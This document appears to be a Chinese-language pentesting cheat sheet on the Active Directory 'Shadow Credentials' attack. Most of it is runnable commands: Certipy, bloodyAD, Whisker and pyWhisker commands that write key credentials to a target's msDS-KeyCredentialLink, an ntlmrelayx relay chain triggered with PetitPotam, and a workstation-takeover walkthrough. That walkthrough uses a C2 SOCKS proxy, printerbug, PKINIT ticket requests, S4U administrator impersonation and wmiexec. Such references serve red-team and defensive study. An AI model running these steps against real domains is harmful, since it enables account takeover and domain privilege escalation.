# 密码 - 影子凭据 (Shadow Credentials)

> 将 **Key Credentials** (密钥凭据) 添加到目标用户/计算机对象的 `msDS-KeyCredentialLink` 属性中，然后以该帐户身份使用 PKINIT 执行 Kerberos 身份验证，以获取该用户的 TGT。当尝试使用 PKINIT 进行预身份验证时，KDC 会检查进行身份验证的用户是否拥有匹配的私钥，如果匹配，则会发送 TGT。

:warning: 用户对象无法编辑自己的 `msDS-KeyCredentialLink` 属性，而计算机对象可以。计算机对象可以编辑自己的 msDS-KeyCredentialLink 属性，但前提是尚不存在 KeyCredential，此时它才能添加一个。

**要求 (Requirements)**:

* 域控制器（至少）为 Windows Server 2016
* 域必须配置有 Active Directory `证书服务` (Certificate Services) 和 `证书颁发机构` (Certificate Authority)
* PKINIT Kerberos 身份验证
* 具有写入目标对象 `msDS-KeyCredentialLink` 属性的委派权限的帐户

**利用 (Exploitation)**:

* [ly4k/Certipy](https://github.com/ly4k/Certipy)

  ```ps1
  certipy shadow auto -account user -dc-ip 10.10.10.10 -dns-tcp -ns 10.10.10.10 -k -no-pass -target dc.domain.lab
  certipy shadow -u 'attacker@domain.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' -account 'victim' add
  ```

* [CravateRouge/bloodyAD](https://github.com/CravateRouge/bloodyAD):

  ```ps1
  bloodyAD --host 10.10.10.10 -u username -p 'P@ssw0rd' -d domain.lab add shadowCredentials targetpc$
  bloodyAD --host 10.10.10.10 -u username -p 'P@ssw0rd' -d domain.lab remove shadowCredentials targetpc$ --key <key from previous output>
  ```

* [eladshamir/Whisker](https://github.com/eladshamir/Whisker):

  ```powershell
  # 列出目标对象的 msDS-KeyCredentialLink 属性的所有条目。
  Whisker.exe list /target:computername$

  # 生成公钥-私钥对，并将新的密钥凭据添加到目标对象，就像用户从新设备注册 WHfB 一样。
  Whisker.exe add /target:"TARGET_SAMNAME" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
  Whisker.exe add /target:computername$ [/domain:constoso.local /dc:dc1.contoso.local /path:C:\path\to\file.pfx /password:P@ssword1]

  # 从由 DeviceID GUID 指定的目标对象中删除密钥凭据。
  Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /remove:2de4643a-2e0b-438f-a99d-5cb058b3254b
  ```

* [ShutdownRepo/pyWhisker](https://github.com/ShutdownRepo/pyWhisker):

  ```ps1
  # 列出目标对象的 msDS-KeyCredentialLink 属性的所有条目。
  python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "list"

  # 生成公钥-私钥对，并将新的密钥凭据添加到目标对象，就像用户从新设备注册 WHfB 一样。
  pywhisker.py -d "FQDN_DOMAIN" -u "user1" -p "CERTIFICATE_PASSWORD" --target "TARGET_SAMNAME" --action "list"
  python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "add" --filename "test1"

  # 从由 DeviceID GUID 指定的目标对象中删除密钥凭据。
  python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "remove" --device-id "a8ce856e-9b58-61f9-8fd3-b079689eb46e"
  ```

## 场景 (Scenario)

### 影子凭据中继 (Shadow Credential Relaying)

* 从 `DC01` 触发 NTLM 身份验证 (PetitPotam)
* 将其中继到 `DC02` (ntlmrelayx)
* 编辑 `DC01` 的属性以创建 Kerberos PKINIT 预身份验证后门 (pywhisker)
* 或者使用：`ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'`

### 利用 RBCD 接管工作站 (Workstation Takeover with RBCD)

**要求 (Requirements)**:

* 运行着 `Print Spooler` (后台打印后台处理程序) 服务
* 运行着 `WebClient service` (WebClient 服务)

**利用 (Exploitation)**:

* 使用你的 C2，在端口 1080 启动反向 socks 代理: `socks 1080`
* 启用从端口 8081 到受感染机器上端口 81 的端口转发:

  ```ps1
  rportfwd 8081 127.0.0.1 81
  ```

* 启动中继:

  ```ps1
  proxychains python3 ntlmrelayx.py -t ldaps://dc.domain.lab --shadow-credentials --shadow-target target\$ --http-port 81
  ```

* 在 webdav 上触发一次回连调用 (callback):

  ```ps1
  proxychains python3 printerbug.py domain.lab/user:password@target.domain.lab compromised@8081/file
  ```

* 使用 [dirkjanm/PKINIT](https://github.com/dirkjanm/PKINITtools) 为机器帐户获取 TGT:

  ```ps1
  proxychains python3 gettgtpkinit.py domain.lab/target\$ target.ccache -cert-pfx </path/from/previous/command.pfx> -pfx-pass <pfx-pass>
  ```

* 通过创建模拟本地管理员的服务票据来提升权限:

  ```ps1
  proxychains python3 gets4uticket.py kerberos+ccache://domain.lab\\target\$:target.ccache@dc.domain.lab cifs/target.domain.lab@domain.lab administrator@domain.lab administrator_target.ccache -v
  ```

* 使用你的票据:

  ```ps1
  export KRB5CCNAME=/path/to/administrator_target.ccache
  proxychains python3 wmiexec.py -k -no-pass domain.lab/administrator@target.domain.lab
  ```

## 参考资料 (References)

* [Shadow Credentials: Workstation Takeover Edition - Matthew Creel - October 21, 2021](https://www.fortalicesolutions.com/posts/shadow-credentials-workstation-takeover-edition)
* [Shadow Credentials - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
* [Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover - Elad Shamir - June 17, 2021](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
